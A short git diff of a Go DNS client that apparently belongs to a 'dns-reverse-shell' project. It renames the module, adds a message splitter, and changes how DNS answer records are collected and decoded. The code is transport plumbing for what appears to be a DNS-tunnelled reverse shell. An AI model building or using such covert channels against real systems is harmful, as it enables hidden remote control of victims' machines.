@@ -1,18 +1,19 @@
 package protocol
 
 import (
-	"dns-shellcode/main/encoder"
+	"dns-reverse-shell/main/encoder"
 	"fmt"
 	"github.com/miekg/dns"
 )
 
 type DNSClient struct {
-	address string
-	encoder encoder.StringEncoder
+	address         string
+	encoder         encoder.StringEncoder
+	messageSplitter MessageSplitter
 }
 
 func NewDNSClient(address string, encoder encoder.StringEncoder) *DNSClient {
-	return &DNSClient{address: address, encoder: encoder}
+	return &DNSClient{address: address, encoder: encoder, messageSplitter: NewSimpleMessageSplitter()}
 }
 
 func (d DNSClient) SendMessage(message string) {
@@ -36,7 +37,6 @@ func (d DNSClient) createMessage(message string) *dns.Msg {
 }
 
 func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
-	for _, ans := range answerMsg.Answer {
-		fmt.Println(d.encoder.Decode(ans.Header().Name))
-	}
+	collect := d.messageSplitter.Collect(answerMsg.Answer)
+	fmt.Println(d.encoder.Decode(collect))
 }
